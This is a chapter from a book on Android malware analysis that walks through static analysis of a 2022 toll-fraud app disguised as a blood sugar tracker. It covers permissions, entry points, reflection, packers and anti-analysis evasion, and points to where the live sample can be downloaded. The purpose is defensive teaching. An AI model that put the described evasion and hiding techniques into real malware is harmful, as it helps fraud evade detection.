<html><head></head><body>
<div id="book-content">
<div id="sbo-rt-content"><h2 class="h2" id="ch03"><span epub:type="pagebreak" id="page_71"/><strong><span class="big">3</span><br/>STATIC ANALYSIS</strong></h2>&#13;
<div class="image1"><img src="../images/common.jpg" alt="Image" width="189" height="189"/></div>&#13;
<p class="noindentsa">This chapter and the next present a hands-on approach to Android malware analysis by walking through an examination of two Android malware samples from 2022, a toll fraud app and a phishing app. In this chapter, we focus on static malware analysis and code reading. In <a href="ch04.xhtml">Chapter 4</a>, we discuss dynamic analysis, or running a malware sample in a controlled environment to observe its behavior.</p>&#13;
<p class="indent">Rather than treating these chapters as references, you should consider them to be examples of real malware analyses through which we introduce Android reverse engineering tools and highlight certain best practices. Collectively, the authors of this book have examined more than 100,000 Android malware samples over the last 10 years. Here, we share some of what we have learned to give your own analyses a jump start.</p>&#13;
<h3 class="h3" id="ch03lev1"><span epub:type="pagebreak" id="page_72"/><strong>What Is Static Code Analysis?</strong></h3>&#13;
<p class="noindent">The term <em>static code analysis</em>, or simply <em>static analysis</em>, refers to the process of analyzing a program to discover its properties without actually executing it. This strategy contrasts with <em>dynamic analysis</em>, introduced in the next chapter, where the program under observation is run to observe its runtime behavior.</p>&#13;
<p class="indent">Static analysis encompasses many techniques. You can think of it as a set of approaches to reasoning about programs, including reading program code as well as automated strategies like control flow analysis and data flow analysis aimed at understanding the order in which a program executes instructions and how data flows through its variables and memory. There are also more advanced static analysis techniques, such as model checking (used to confirm or disprove properties of a piece of code) and abstract interpretation (a way to explore program states through simulated execution), but we won’t cover these advanced techniques in this book.</p>&#13;
<p class="indent">The following subsections provide some general guidelines for making static analysis more efficient.</p>&#13;
<h4 class="h4" id="ch03lev1sec1"><strong><em>Guided vs. Unguided Analysis</em></strong></h4>&#13;
<p class="noindent">In professional malware analysis, it is rare to examine a random app sample that you don’t know anything about. Instead, reverse engineers usually look at a particular app to confirm or disprove previously collected assumptions about its properties. This information can come from malware scanners that flag an app on your system, random X chatter, the output of a quick run in an analysis engine, or analysis of related samples. In these <em>guided</em> scenarios, reverse engineers generally know where to start looking. The malware walkthroughs in this and the next chapter are <em>unguided</em>, meaning we embark without any prior information about the samples. All discoveries must be made by inspecting the apps.</p>&#13;
<p class="indent">Even though unguided reverse engineering is less common in a professional context, it can still happen. In these scenarios, reverse engineers should find ways to avoid doing full code reviews, as these are costly and take too long for all but the most important malware samples. At the same time, the reverse engineer must remain confident that no significant part of the malware remains undiscovered, even when the code analysis is partial.</p>&#13;
<p class="indent">The easiest way to avoid full code reviews is to develop an understanding of the SDKs used in apps. We estimate that about 80 percent of the code in an average app comes from third-party SDKs. Android reverse engineers must have tools for identifying SDKs; otherwise, they will find themselves painstakingly rediscovering information they could have learned by reading publicly available SDK documentation.</p>&#13;
<h4 class="h4" id="ch03lev1sec2"><span epub:type="pagebreak" id="page_73"/><strong><em>Knowing When You’re Done</em></strong></h4>&#13;
<p class="noindent">In a professional setting, the goal of the analysis determines when you are done. If the goal is to classify an app as malware and protect users as fast as possible, malware analysis can be extremely superficial. For a phishing app, for example, you can look through a sample for less than a minute, find evidence that it targets banking apps, record this, and move on. If the goal is to document the malicious functionality in a report, or if the analysis is in response to an incident at a customer site, you may have to go deeper and spend days or weeks on the sample. This chapter and the next will aim to describe the most important functionality of the presented malware samples.</p>&#13;
<p class="indent">Experience has shown that malware analysts should either move quickly, to rapidly confirm that an app is malware so steps can be taken to disable it, or move slowly in order to investigate it in depth and, along the way, learn how to improve their tools and processes. Avoid lengthy malware analysis in cases when you aren’t likely to learn any lessons for making future analysis easier.</p>&#13;
<h3 class="h3" id="ch03lev2"><strong>Loading the Malware Sample into jadx</strong></h3>&#13;
<p class="noindent">The Android malware sample we analyze in this chapter is <em>com.bp.statis.bloodsugar</em> (v20, adcf). This app, which masquerades as a blood sugar statistics tracker, was uploaded to Google Play in February 2022 and is fairly representative of modern Android malware. It contains many anti-analysis techniques, downloads remote components from a command-and-control server, and abuses mobile carrier billing options to run up fraudulent charges. You can download the file from <a href="https://github.com/android-malware-ml-book"><em>https://github.com/android-malware-ml-book</em></a>.</p>&#13;
<p class="indent">To read the app’s code, we use the open source Android reverse engineering tool <em>jadx</em>. This tool can take Android code files in formats like APK, DEX, JAR, and others and turn them into decompiled Java code that we can understand. Additionally, jadx has handy features such as the ability to rename variables and locate the places where variables and methods appear in the code. It even has advanced tools like a debugger, automated code deobfuscation, and integration with Quark Engine, an open source malware analysis engine. You can download jadx from <a href="https://github.com/skylot/jadx"><em>https://github.com/skylot/jadx</em></a>.</p>&#13;
<p class="indent">In the GUI version of jadx, use <strong>File</strong> ▸ <strong>Open Files</strong> to open the malware sample to analyze. You should then see the app’s Java package structure in the navigation tree on the left-hand side of the interface (<a href="ch03.xhtml#ch3fig1">Figure 3-1</a>).</p>&#13;
<p class="indent">The large window on the right-hand side shows the decompiled code for the selected Java class.<span epub:type="pagebreak" id="page_74"/></p>&#13;
<div class="image"><img id="ch3fig1" src="../images/ch03fig01.jpg" alt="Image" width="845" height="537"/></div>&#13;
<p class="figcap"><em>Figure 3-1:  The jadx main window looks like a code IDE.</em></p>&#13;
<h3 class="h3" id="ch03lev3"><strong>Malicious Code in the Permissions</strong></h3>&#13;
<p class="noindent">The first step of a static analysis should be to locate the malicious parts of the app as quickly as possible. Analysts each have their preferences about how to do this, as it is not an exact science. We will introduce you to four options that we use regularly. The first, described in this section, is to look at the permissions the app declares its intention to use and figure out how it might use them.</p>&#13;
<p class="indent">Permissions are often the first thing on people’s minds when they consider the security of Android apps. Apps must declare permissions in order to use sensitive Android APIs, and users must grant the necessary permissions to the apps before they can access those APIs. As this permission model relies on user interaction and consent, it is highly visible to everybody using Android phones. However, users and reverse engineers alike often draw the wrong conclusions about apps based on their permissions. The permission system is ultimately a gentleman’s agreement between the app and the user: the app declares that it will use a permission for an advertised purpose, but the operating system can’t check what the app actually does with it.</p>&#13;
<p class="indent">Moreover, getting an accurate view of how an app uses permissions can be complicated. Apps can hide this information through techniques like reflection, as we show later in this chapter. Apps can also collude with each other to indirectly access more permissions than the user granted them. If an app doesn’t have permission to send SMS messages, it may ask another <span epub:type="pagebreak" id="page_75"/>installed app to send messages on its behalf. In the worst case, malware could even use exploits to elevate its privileges outside the boundaries of the permission system.</p>&#13;
<p class="indent">Nevertheless, permissions still provide a reasonable way to gain insight into unknown malware. Malware that colludes with other apps or uses exploits to elevate its permission privileges is rare. Without any indicators that you’re dealing with such malware, it’s reasonable to treat the permissions declared by an app as the limits of its capabilities.</p>&#13;
<h4 class="h4" id="ch03lev1sec3"><strong><em>Viewing the Permissions</em></strong></h4>&#13;
<p class="noindent">Apps must declare all permissions they want to use in their <em>Android Manifest.xml</em> file, found in the root folder of an Android app’s APK. <a href="ch03.xhtml#ch3fig2">Figure 3-2</a> shows the beginning of the manifest file for our sample, which you can view in jadx by navigating to <strong>Resources</strong> ▸ <strong>AndroidManifest.xml</strong>.</p>&#13;
<div class="image"><img id="ch3fig2" src="../images/ch03fig02.jpg" alt="Image" width="694" height="265"/></div>&#13;
<p class="figcap"><em>Figure 3-2: Viewing app permissions in jadx</em></p>&#13;
<p class="indent">Here, you can see some of the app’s requested permissions. Others, declared later in the file, are not visible in the screenshot. The sample uses <code>&lt;uses-permission&gt;</code> tags to declare its intent to use the following permissions:</p>&#13;
<ul>&#13;
<li class="noindent"><code>INTERNET</code></li>&#13;
<li class="noindent"><code>WAKE_LOCK</code></li>&#13;
<li class="noindent"><code>RECEIVE_BOOT_COMPLETED</code></li>&#13;
<li class="noindent"><code>READ_CONTACTS</code></li>&#13;
<li class="noindent"><code>READ_PHONE_STATE</code></li>&#13;
<li class="noindent"><code>CHANGE_NETWORK_STATE</code></li>&#13;
<li class="noindent"><code>ACCESS_NETWORK_STATE</code></li>&#13;
<li class="noindent"><code>BIND_GET_INSTALL_REFERRER_SERVICE</code></li></ul>&#13;
<p class="noindent">Using <code>&lt;service&gt;</code> tags, it also declares its intent to use these permissions:</p>&#13;
<ul>&#13;
<li class="noindent"><code>BIND_NOTIFICATION_LISTENER_SERVICE</code></li>&#13;
<li class="noindent"><code>BIND_JOB_SERVICE</code></li></ul>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_76"/>For malware analysis, not all permissions are equally important. For example, the <code>WAKE_LOCK</code> permission doesn’t seem particularly interesting, as it refers to APIs for keeping devices awake or waking them up from sleep. The <code>INTERNET</code> permission is also not useful; nearly every app uses it, so it doesn’t help us differentiate between malicious and benign apps. On the other hand, any of the data access permissions, whose names start with <code>READ_</code>, are potentially interesting. For example, why would a blood sugar metrics app need access to your contact list?</p>&#13;
<h4 class="h4" id="ch03lev1sec4"><strong><em>Finding the APIs Gated by Permissions</em></strong></h4>&#13;
<p class="noindent">To find malicious code based on an app’s declared permissions, you also need to know which Android APIs the permissions protect, or <em>gate</em>. Figuring this out is a surprisingly complex process, because no official reference for this information exists. Over the years, several academic research teams have tried to create Android API permission maps. This has also proved complicated—each new Android version introduces changes to the permission system, so keeping API maps up-to-date is a chore—but these maps can help you locate the permission-gated APIs. In 2016, researchers from Saarland University and Pennsylvania State University created such a map, which you can find at <a href="https://github.com/reddr/axplorer"><em>https://github.com/reddr/axplorer</em></a>. Another option is the map created by researchers at Purdue University in 2018, which you can find at <a href="https://arcade-android.github.io/arcade"><em>https://arcade-android.github.io/arcade</em></a>.</p>&#13;
<p class="indent">Unfortunately, jadx cannot automatically show the APIs gated by permissions. To quickly locate them in the app, you could use the command line version of jadx and then write a script that parses one of the permission maps to compare it with the app’s decompiled code. Over time, serious Android reverse engineers should build a more robust solution for this task.</p>&#13;
<p class="indent">Another approach to locating permission-protected APIs in well-developed apps is to look for code that asks the user for consent to use these permissions. For example, you could search for strings containing <em>permission</em>, or for APIs used to request permission access. Well-written apps should ask users for consent right before they want to use an API, so the relevant code should be nearby.</p>&#13;
<h4 class="h4" id="ch03lev1sec5"><strong><em>Analyzing the READ_CONTACTS Permission</em></strong></h4>&#13;
<p class="noindent">The <code>READ_CONTACTS</code> permission showcases another problem with permission maps: in Android, permissions don’t protect just APIs. They also protect the content providers that are the sources of sensitive data. While the permission maps mentioned in the previous section show some very obscure APIs behind the <code>READ_CONTACTS</code> permission, this permission usually just provides access to the user’s contact list through the content providers <code>content://contacts</code> or <code>content://com.android.contacts</code>.</p>&#13;
<p class="indent">Thus, upon spotting this permission, you might first think that it might be used to steal someone’s contact list information. However, why wouldn’t a spyware app also request <code>READ_SMS</code>, <code>READ_CALENDAR</code>, and <code>READ_CALL_LOGS</code> permissions to steal SMS, calendar, and call information? Spyware that targets only <span epub:type="pagebreak" id="page_77"/>contact list information certainly exists, but it’s much rarer than spyware that grabs more information.</p>&#13;
<p class="indent">In jadx, you can use the hotkey <small>CTRL-SHIFT-F</small> to search through all of an app’s code and resource files. But searching for <em>contact</em> and disabling case sensitivity in our sample returns only a few results, including the permission declaration in the manifest file. A couple of code lines, in classes in packages whose names start with <em>androidx.activity</em> or <em>com.google.android.gms</em>, appear to be APIs provided by Google. Using <code>READ_CONTACTS</code> to find malicious functionality didn’t work out for this sample.</p>&#13;
<p class="indent">Again, though, there are caveats to concluding that this permission <em>isn’t</em> used maliciously. The malicious code using <code>READ_CONTACTS</code> could be in an encrypted code section or otherwise hidden from our manual analysis. Or the code files described as Google APIs could have been injected with malicious code. Or maybe those code files have nothing to do with Google SDKs and are malicious code files that have adopted the standard Google class naming pattern.</p>&#13;
<p class="indent">Any of these could be true, but we recommend going broad first and deep later. As long as you have other ways to progress through an app, chase those leads down before delving into possible but unlikely scenarios like manipulated Google SDKs (which definitely exist in real malware but are rarely encountered in any individual malware sample). Later in this chapter, we will discover that this malware uses <code>READ_CONTACTS</code> after all. Its use is hidden from casual analysis.</p>&#13;
<h4 class="h4" id="ch03lev1sec6"><strong><em>Analyzing the BIND_NOTIFICATION_LISTENER_SERVICE Permission</em></strong></h4>&#13;
<p class="noindent">Another interesting permission in the sample is <code>BIND_NOTIFICATION_LISTENER_SERVICE</code>, which allows apps to access the notifications shown to the user by all other apps. Despite its seemingly harmless functionality, malware often abuses this permission, as app notifications can contain sensitive information that malware likes to steal.</p>&#13;
<p class="indent">This permission is always tied to a service that receives updates about new notifications. <a href="ch03.xhtml#ch3lis1">Listing 3-1</a> shows how our sample app declares the use of the permission and its associated service.</p>&#13;
<pre>&lt;service android:name="com.bp.statis.bloodsugar.PE" &#13;
         android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"&gt;&#13;
  &lt;intent-filter&gt;&#13;
    &lt;action android:name="android.service.notification.NotificationListenerService"/&gt;&#13;
  &lt;/intent-filter&gt;&#13;
&lt;/service&gt;</pre>&#13;
<p class="list" id="ch3lis1"><em>Listing 3-1: The declaration of the notification listener service, which receives information about incoming notifications</em></p>&#13;
<p class="indent">The name of the service class is declared as <code>com.bp.statis.bloodsugar.PE</code>, but if you look for this class in the jadx file browser, you won’t be able to find it. That’s noteworthy. Why would the app declare a service for which no code is available? It could be a bug in the app, but later in this chapter we <span epub:type="pagebreak" id="page_78"/>will discover that the class is in fact hidden from analysis. For now there is little we can do, as we are unable to locate the service code. For brevity, we leave a similar analysis of the other declared permissions as an exercise for the reader.</p>&#13;
<h3 class="h3" id="ch03lev4"><strong>Malicious Code in App Entry Points</strong></h3>&#13;
<p class="noindent">Android applications have a surprisingly large number of <em>entry points</em>, or parts of the code where the Android operating system starts executing the app. Common entry points are exported activities (including the app’s main activity); broadcast receivers, which handle messages sent by the operating system or other apps; services defined by the app to execute long-running operations; and subclasses of the <code>android.app.Application</code> class. Looking at code at these entry points can be a fruitful way to find malicious code, as harmful functionality likes to run sooner rather than later. Why wait for the user to interact with an app for 10 minutes when you can steal their information right away, when they launch the app?</p>&#13;
<p class="indent">Still, not all entry points are equally likely to harbor malicious code, and we should first consider those that are more commonly used in malware. For example, while every malicious and benign app has a main activity, looking there for malicious functionality is likely not a good start. On the other hand, looking at the broadcast receiver for the <code>BOOT_COMPLETED</code> events may be more promising. Malware likes to gain persistence on devices, and having the system execute the malware every time the device reboots is a common way to achieve that goal.</p>&#13;
<h4 class="h4" id="ch03lev1sec7"><strong><em>Exported Activities</em></strong></h4>&#13;
<p class="noindent">In Android apps, <em>activities</em> are the key mechanism for presenting user interfaces. They’re best thought of as screens or dialogs. When a user launches an app, the first thing they usually see is the main activity. User interactions with the current activity may trigger new activities, like the next step in a workflow, a settings activity, or a file sharing activity.</p>&#13;
<p class="indent">Not all activities are entry points into applications. To identify those, we need to distinguish between so-called <em>exported</em> and <em>non-exported</em> activities. Activities marked in the manifest file as <code>android:exported=”true”</code> can be started from outside the current app and so are considered entry points. Activities marked as <code>android:exported=”false”</code> can only be started from within the current app and are not entry points.</p>&#13;
<p class="indent">However, finding exported activities can be tricky. Before Android 12, developers could omit the <code>android:exported</code> tag from activity declarations. In those cases, whether the activity’s default value was <code>true</code> or <code>false</code> depended on other configuration properties. This proved confusing to app developers and led to mistakes and security vulnerabilities due to accidentally exported activities, which is why Android versions 12 and beyond require explicit declarations for all activities of an app. For analysis of apps developed for earlier versions (prior to Android API 31), our recommendation is to learn <span epub:type="pagebreak" id="page_79"/>the rules once and encode them in a small helper tool that can highlight exported activities. Otherwise, reverse engineers may make the same mistakes that app developers made.</p>&#13;
<p class="indent">Our sample declares only one interesting activity: its main activity, shown in <a href="ch03.xhtml#ch3lis2">Listing 3-2</a>. The other activities are activities from Google SDKs, and for now, we consider them legitimate and not maliciously manipulated.</p>&#13;
<pre>&lt;activity android:name="com.bp.statis.bloodsugar.MainActivity" &#13;
          android:configChanges="screenSize|orientation"&gt;&#13;
  &lt;intent-filter&gt;&#13;
    &lt;action android:name="android.intent.action.MAIN"/&gt;&#13;
    &lt;category android:name="android.intent.category.LAUNCHER"/&gt;&#13;
  &lt;/intent-filter&gt;&#13;
&lt;/activity&gt;</pre>&#13;
<p class="list" id="ch3lis2"><em>Listing 3-2: The declaration of our sample’s main activity</em></p>&#13;
<p class="indent">The XML declaration code of main activities is full of boilerplate code. For us, the only important part is the name of the activity, <code>com.bp.statis.bloodsugar.MainActivity</code>. Double-clicking this name in jadx takes you straight to its definition. Unfortunately, it consists of more than 600 lines of user interface code without any interesting features. As the app doesn’t have any other exported activities, there’s nothing more to look for in this section.</p>&#13;
<h4 class="h4" id="ch03lev1sec8"><strong><em>Broadcast Receivers</em></strong></h4>&#13;
<p class="noindent">Another key concept in Android is <em>broadcast receivers</em>, part of Android’s messaging system. All Android apps can send messages (broadcasts) to each other or themselves, and broadcast receivers receive and handle incoming messages.</p>&#13;
<p class="indent">For reverse engineering, broadcast receivers fall into two distinct categories: they can either be declared in the manifest file (so-called <em>manifest-registered receivers</em>) or registered programmatically when an app is running (<em>context-registered receivers</em>). The ones declared in the manifest are easy to spot, as they cannot be hidden from malware analysts. The ones registered at runtime are not so easy to locate, as they can be hidden by encrypted or obfuscated code that makes the API calls necessary to set up the receivers.</p>&#13;
<p class="indent">Starting with Android API 26, the system uses only manifest-declared receivers to wake up apps. Context-registered receivers can operate only when an app is already running. Thus, to find entry points into applications, we should consider only manifest-declared receivers.</p>&#13;
<p class="indent">While our sample’s manifest file declares eight broadcast receivers using the <code>&lt;receiver&gt;</code> tag, they all point to classes that seem to come from standard Google SDKs. Even though broadcast receivers don’t appear to provide any useful entry points here, many malware samples do use them. For example, registering to receive <code>BOOT_COMPLETED</code> messages is a popular way for malware to start running again after a system reboot. Later in this chapter, you’ll also see that our sample sets up context-registered receivers for which no trace can be found in the manifest file. In particular, the malware registers a <span epub:type="pagebreak" id="page_80"/><code>RECEIVE_SMS</code> receiver to intercept incoming SMS messages and steal one-time passwords.</p>&#13;
<h4 class="h4" id="ch03lev1sec9"><strong><em>Services</em></strong></h4>&#13;
<p class="noindent"><em>Services</em> are the default way for apps to execute long-running operations in the background. Developers must declare all services in an app’s manifest file, making them easily discoverable. While services are not entry points into apps (all services must be launched by the running app itself), they are great entry points into reverse engineering as the service class declarations cannot be hidden or obfuscated and their code forms distinct units of functionality that can be analyzed in isolation. Many malware samples use these to perform malicious operations, so looking for service entry points is a quick way to find such code.</p>&#13;
<p class="indent">Our sample declares nine services, of which eight once again seem to belong to Google SDKs. The one remaining service is <code>com.bp.statis.bloodsugar.PE</code>, which we previously discussed when analyzing the permissions. This service receives and intercepts incoming notifications from all apps on the system.</p>&#13;
<h4 class="h4" id="ch03lev1sec10"><strong><em>Application Subclasses</em></strong></h4>&#13;
<p class="noindent">Other legitimate entry points into Android apps, though a little obscure, are subclasses of the <code>android.app.Application</code> class. By default, all Android apps have an implementation of this Java class. Apps that need to deviate from default app behavior can subclass this default class. If an app uses such a subclass, you can find its name in the <code>&lt;application&gt;</code> tag in the manifest file.</p>&#13;
<p class="indent">Our sample does declare a subclass of the default <code>android.app.Application</code> implementation. Within the <code>&lt;application&gt;</code> tag, you should see the following declaration, where the fully qualified name specified as the value of the <code>android:name</code> attribute overrides the default class:</p>&#13;
<pre>android:name="androidx.multidex.MultiDexApplication"</pre>&#13;
<p class="indent">Based on its path name, this <code>androidx.multidex.MultiDexApplication</code> class seems to come from a default Google SDK. Digging into the official documents, one can learn that it was introduced to get around size limits for large apps. In our experience, apps today increasingly make use of this attribute, so seeing it is fairly common.</p>&#13;
<p class="indent">However, our sample has maliciously modified this class. Double-clicking the class name in jadx opens the code in <a href="ch03.xhtml#ch3lis3">Listing 3-3</a>.</p>&#13;
<pre>package androidx.multidex;&#13;
&#13;
import android.app.Application;&#13;
import android.content.Context;&#13;
import d.b;&#13;
&#13;
/* loaded from: classes.dex */&#13;
public class MultiDexApplication extends Application {&#13;
  @Override // android.app.Application&#13;
  public void onCreate() {&#13;
    super.onCreate();&#13;
    new b(this).o();&#13;
  }&#13;
&#13;
  @Override // android.content.ContextWrapper&#13;
  protected void attachBaseContext(Context context) {&#13;
    super.attachBaseContext(context);&#13;
    MultiDex.install(this);&#13;
  }&#13;
}</pre>&#13;
<p class="list" id="ch3lis3"><span epub:type="pagebreak" id="page_81"/><em>Listing 3-3: Malicious code is started from an <span class="codeitalic1">android.app.Application</span> subclass.</em></p>&#13;
<p class="indent">Most of the code is boilerplate, except for the line <code>new b(this).o()</code>. The instantiation of an object of class <code>d.b</code> and the calling of its method <code>o</code> is highly unusual. Double-clicking either <code>d</code> or <code>o</code> in jadx takes you to heavily obfuscated code. We will revisit that code later.</p>&#13;
<h3 class="h3" id="ch03lev5"><strong>Hiding Malicious Code</strong></h3>&#13;
<p class="noindent">If we hadn’t already found a hook into the malicious code, another option could be to look for anti-analysis techniques and attempts to hide code from malware analysts. This technique is useful partly because malicious code often tries to hide and partly because such analysis broadens our understanding of an app and ensures that we don’t miss any of its key functionality.</p>&#13;
<p class="indent">At a high level, we recommend looking for the following common strategies: dynamic and static anti-analysis techniques, reflection and other dynamic code loading techniques, non-Java code usage, and encryption and obfuscation.</p>&#13;
<h4 class="h4" id="ch03lev1sec11"><strong><em>Anti-Analysis Techniques</em></strong></h4>&#13;
<p class="noindent">Anti-analysis techniques try to throw off static or dynamic analysis and can take many forms. Most malware includes at least a few of these measures to make it harder for malware analysts to understand the specimen, as well as to determine whether it is probably under observation or running on a real user’s device.</p>&#13;
<p class="indent">Discovering and understanding anti-analysis techniques is a science in itself. One way to get started is to read the “Defense Evasion” section of the MITRE ATT&amp;CK framework for Android, a freely available standard to document malware techniques. Over time, we recommend that reverse engineers build tools to pinpoint anti-analysis techniques in apps. Doing this work manually is difficult and time-consuming, as hundreds of individual anti-analysis techniques exist and are publicly documented.</p>&#13;
<p class="indent">Static analysis can be particularly helpful in detecting dynamic anti-analysis techniques. Anti-analysis techniques designed to thwart dynamic <span epub:type="pagebreak" id="page_82"/>analysis commonly focus on understanding the environment in which the malware runs. Some try to detect analysis tools, such as emulators, debuggers, or sandboxes, and avoid running if those tools are detected. Others use environmental properties of the device to try to figure out whether they are running in a security analysis system. For example, they might wait a certain amount of time before executing malicious functionality. They might also focus on geographic properties of the device, for example to find out whether it’s located in a certain country or connected to a certain mobile carrier. Some malware checks for the device’s language or the user’s time zone.</p>&#13;
<p class="indent">Smarter malware apps use more sophisticated methods that consider information from outside the device. For example, we have seen apps that check whether they are still published on Google Play or whether a connection to their servers comes from the IP range of a given country. A particularly common technique these days is to check whether an app was installed through an ad click that the malware author paid for. The app will execute malicious functionality only if the user installed the app from this ad; automated security tools that didn’t install the app by clicking on the ad won’t be able to trigger its malicious payload. This technique can get tricky if parts of the ad campaign’s properties are used as decryption keys for later stages of code. If you don’t have information from the ad click, you may not be able to decrypt parts of the malicious code.</p>&#13;
<p class="indent">Static anti-analysis techniques focus on denying static analysis tools the ability to inspect and understand code. In Android malware, this commonly means hiding code, encrypting code, or loading code in later stages to make sure that it is not even available for static analysis at all. In addition, Android malware commonly uses commercial or freely available <em>app packers</em>, which take an app and encrypt or compress its original code. Many off-the-shelf app packers exist for Android, usually marketed as tools to protect intellectual property. Their use to protect Android apps is particularly widespread in China, and many available app packers originate from there.</p>&#13;
<p class="indent">These tools often apply sophisticated static anti-analysis techniques. To make the original code harder to understand, they might implement control flow obfuscation (garbling the original flow of code through an app) or data flow obfuscation (making it harder to follow how variables interact with each other). The most sophisticated app packers even take original app code and recompile it into their own custom code. Understanding such transformed code requires knowledge of the bytecode defined by the packer and the abstract machine that interprets it.</p>&#13;
<h4 class="h4" id="ch03lev1sec12"><strong><em>Reflection</em></strong></h4>&#13;
<p class="noindent">Reflection is another common anti-analysis technique. Many modern Android malware samples split malicious functionality across multiple dynamically loaded stages that operate like plug-ins. Usually, the first stage, directly embedded in the app, is small and benign. It often does nothing but observe its runtime environment. If it doesn’t detect any analysis tools, it loads the second stage, which contains more malicious functionality.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_83"/>The Java reflection APIs, defined in the Java package <em>java.lang.reflect</em>, are used to dynamically look up, instantiate, and invoke classes and methods. They allow apps to dynamically load code that may not be present at compile time, such as plug-ins. Benign apps often use these APIs, too. For instance, they might load benign plug-ins, select between different APIs depending on the current operating system version, or access private APIs that are supposed to be hidden from apps.</p>&#13;
<p class="indent">Nevertheless, looking for reflection APIs is effective in malware analysis because the use of reflection cannot be hidden. Moreover, distinguishing between benign and malicious uses of reflection is often easy. In nearly all cases, benign reflection supplies constant arguments to the reflection APIs. For example, apps might look up private Android APIs by name. Malicious reflection typically uses non-constant arguments that are stitched together at runtime, or encrypted or obfuscated strings that it decodes right before passing them to the reflection APIs. That makes it very easy for human reviewers to quickly sort through uses of reflection and find the ones that are most likely malicious.</p>&#13;
<p class="indent">In decompiled jadx code, all classes that use reflection begin with an import statement for the reflection API, so using the search dialog to look for <code>import java.lang.reflect</code> should return all of these classes. In the case of our sample app, the search dialog returns 293 results, showing just how common reflection is. Assuming once again that standard SDK classes haven’t been maliciously modified, we can discard all results in Java packages <em>androidx.*</em>, <em>kotlin.*</em>, and <em>com.google.*</em>. That leaves a few hits in packages starting with <em>b.*</em>, <em>d.*</em>, and <em>e.*</em>. We already identified the package <em>d.*</em> as a likely candidate for malicious code, so let’s look at the other two packages first.</p>&#13;
<p class="indent">The randomly selected class <code>b.j.k</code> shows an example of reflection code that is probably benign. As shown in <a href="ch03.xhtml#ch3lis4">Listing 3-4</a>, the reflection code tries to load some class whose name contains the string <code>_LifecycleAdapter</code>. This code does not seem obfuscated or dynamic enough for malicious reflection.</p>&#13;
<pre>public static String b(String str) {&#13;
  return str.replace(".", "_") + "_LifecycleAdapter";&#13;
}&#13;
&#13;
public static int c(Class&lt;?&gt; cls) {&#13;
  ...&#13;
  String b2 = b(canonicalName);&#13;
  if (!name.isEmpty()) {&#13;
    b2 = name + "." + b2;&#13;
  }&#13;
  constructor = Class.forName(b2).getDeclaredConstructor(cls);&#13;
  ...&#13;
}</pre>&#13;
<p class="list" id="ch3lis4"><em>Listing 3-4: A benign use of reflection in the app</em></p>&#13;
<p class="indent">More importantly, the class has two significant strings: <code>_LifecycleAdapter</code> and <code>The observer class has some methods that use newer...</code>, the latter of which <span epub:type="pagebreak" id="page_84"/>we have omitted from the listing for brevity. A quick web search shows that these strings are taken from a standard Android class called <code>androidx.lifecycle.ClassesInfoCache</code>, meaning this code is likely benign.</p>&#13;
<p class="indent">Most code obfuscators leave the package hierarchy intact when transforming original code into obfuscated code. Thus, sibling packages in obfuscated code are likely sibling packages in the original code. If the class <code>b.j.k</code> is <code>androidx.lifecycle.ClassesInfoCache</code>, it is highly likely that all classes in the package <em>b.j</em> belong to <code>androidx.lifecycle</code> and that all classes in <em>b.*</em> belong to <code>androidx.*</code>. We’ll make this assumption for now, declaring all uses of reflection in <em>b.*</em> safe and moving on. Similar analysis of the reflection code found in the <em>e.*</em> package shows that this is likely a standard library, too.</p>&#13;
<p class="indent">In addition to the Java reflection APIs in the <em>java.lang.reflect</em> package, Android provides some other code loading APIs often used by benign and malicious apps alike. The two most common of these are <code>dalvik.system.DexClassLoader</code> and <code>dalvik.system.DexFile</code> (deprecated in Android API 26). These APIs can load entire Android code files and are frequently used to load plug-ins. Java and Android have other related APIs, commonly referred to as <em>ClassLoader APIs</em>. We recommend developing an understanding of these, or even better, an automated tool to surface them in apps. In particular, APIs for loading code from byte arrays in memory rather than files on disk are becoming more popular in Android malware. Using this technique, they can avoid leaving behind artifacts that security researchers could discover.</p>&#13;
<p class="indent">Try searching our sample app for <code>dalvik.system.Dex</code>. It should return just a single use outside of the standard SDKs, once again in the probably malicious <em>d.*</em> package.</p>&#13;
<h4 class="h4" id="ch03lev1sec13"><strong><em>Non-Java Code</em></strong></h4>&#13;
<p class="noindent">Modern Android applications can be written in many programming languages and frameworks other than Java. Examples include Flutter, Kotlin, Xamarin.Android, and ReactNative. Malware developers intentionally use these newer technologies to make malware analysis harder.</p>&#13;
<p class="indent">Some malware developers have started building their malware entirely in these languages. This simple choice already makes analysis more difficult, as most Android reverse engineers likely have good tooling for Java apps but not for those written in other languages. Other malware developers have continued to use Java as their main programming language while strategically developing malicious portions of the app in alternative languages. To detect this malicious activity, automated analysis tools need the ability to understand control and data flow between parts of code written in different languages.</p>&#13;
<p class="indent">The two most common programming languages we see strategically used by malware are JavaScript and native ARM code. JavaScript is most likely used less as a pure anti-analysis technique and more as a way to interact with websites. Native ARM code, which is developed in C, C++, or other languages that compile to ARM code, is regularly used to hide malicious <span epub:type="pagebreak" id="page_85"/>functionality. For example, it’s common for malware to ship native code binary files that contain just a single decryption routine called from Java code.</p>&#13;
<p class="indent">We recommend looking for alternative languages during Android malware analysis, with a particular focus on JavaScript and native ARM code. Malware apps can hide the use of these alternative languages, but they often leave telltale signs. For example, you’ll often find native code in the APK file’s <em>lib</em> folder. Java code keywords for interacting with native code such as <code>native</code> or the API <code>System.loadLibrary</code> also provide strong indicators that the app uses native ARM code. Look for JavaScript in WebView objects, in particular those declaring a JavaScript interface through the API <code>addJavascriptInterface</code>.</p>&#13;
<p class="indent">Our sample does not have any obvious indicators suggesting the use of native ARM code or JavaScript. There are no native code asset files, uses of any of the APIs mentioned above, or keywords that would hint at their presence. Later, you’ll learn that the app does make use of JavaScript, but that use is hidden and not easily discovered.</p>&#13;
<h4 class="h4" id="ch03lev1sec14"><strong><em>Encryption and Encoding</em></strong></h4>&#13;
<p class="noindent">Malware developers love to encrypt and encode strings. In fact, the use of cryptography APIs can provide a hint about the location of malicious functionality. Malware developers often use the default Java implementations of encryption algorithms like AES or RSA from the <em>javax.crypto</em> package. Use of <em>java.util.Base64</em> or <em>android.util.Base64</em> is also common. Looking for references to these packages can help you quickly locate interesting methods, such as those that decrypt communication received from command-and-control servers. However, other than in benign Google SDKs, our sample does not make obvious use of any APIs in <em>javax.crypto</em>. It more often uses <em>java.util.Base64</em>, including in the obfuscated package <em>b.*</em>, which we previously declared harmless.</p>&#13;
